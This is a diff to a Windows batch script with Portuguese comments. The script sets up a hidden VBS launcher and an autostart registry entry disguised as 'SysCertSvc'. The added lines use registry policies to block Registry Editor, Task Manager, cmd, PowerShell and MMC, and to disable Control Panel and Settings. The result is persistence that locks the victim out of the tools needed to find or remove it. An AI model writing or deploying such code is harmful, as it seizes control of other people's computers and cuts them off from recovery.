@@ -20,6 +20,20 @@ set "targetPath=%launcherScriptPath%"
     echo WshShell.Run ^"""" & WScript.Arguments(0) & """" , 0, False
 ) > "%vbsLauncherPath%"
 
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v DisallowRun /t REG_DWORD /d 1 /f >nul
+
+:: Cria a lista de programas proibidos
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "1" /t REG_SZ /d "regedit.exe" /f >nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "2" /t REG_SZ /d "taskmgr.exe" /f >nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "3" /t REG_SZ /d "cmd.exe" /f >nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "4" /t REG_SZ /d "powershell.exe" /f >nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "5" /t REG_SZ /d "mmc.exe" /f >nul
+:: Bloqueia o acesso ao Painel de Controle
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f
+
+:: Bloqueia o acesso às Configurações (Settings)
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSettingsPage /t REG_DWORD /d 1 /f
+
 set "regKey=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
 reg query "%regKey%" /v "SysCertSvc" >nul 2>&1
 if %errorlevel% neq 0 (
